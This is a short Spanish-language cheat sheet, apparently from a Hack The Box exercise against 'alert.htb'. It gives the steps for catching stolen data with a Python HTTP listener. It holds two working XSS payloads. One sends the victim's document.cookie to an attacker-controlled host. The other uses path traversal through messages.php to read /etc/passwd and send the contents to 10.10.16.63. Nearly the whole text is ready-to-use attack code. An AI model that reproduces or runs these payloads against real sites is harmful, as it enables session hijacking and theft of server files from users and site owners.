
1. Nos ponemos por escucha con python3 -m http.server 8000
2. Mandamos el payload
payload: 

### payload robar cookie

```javascript
<script>fetch('http://TU_IP:8000/?c=' + document.cookie)</script>
```
3.  Esperamos que lleguen peticiones.

### payload LFI
<script> fetch("http://alert.htb/messages.php?file=../../../../../../../etc/passwd").then(response => response.text()).then(data => fetch("http://10.10.16.63:8000/?file=" + encodeURIComponent(data))); </script>
